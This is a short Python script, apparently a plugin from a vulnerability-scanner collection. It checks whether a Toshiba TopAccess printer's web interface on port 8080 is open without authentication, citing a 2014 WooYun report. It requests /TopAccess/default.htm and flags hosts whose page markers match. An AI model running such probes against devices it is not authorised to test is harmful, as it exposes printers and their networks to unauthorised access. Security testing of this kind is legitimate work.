#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 东芝topaccess打印机未授权漏洞
referer: http://www.wooyun.org/bugs/wooyun-2014-079938
author: Lucifer
description: 8080端口服务web未授权访问。
'''
import sys
import requests


class printer_topaccess_unauth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        port = 8080
        payload = "/TopAccess/default.htm"
        vulnurl = self.url + ":" + str(port) + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Device/Device.htm" in req.text and r"/TopAccess/js/LoadTopMenu.js" in req.text:
                return "[+]存在东芝topaccess打印机未授权漏洞...(高危)\tpayload: "+vulnurl
            else:
                return "[-]no vuln"

        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = printer_topaccess_unauth_BaseVerify(sys.argv[1])
    testVuln.run()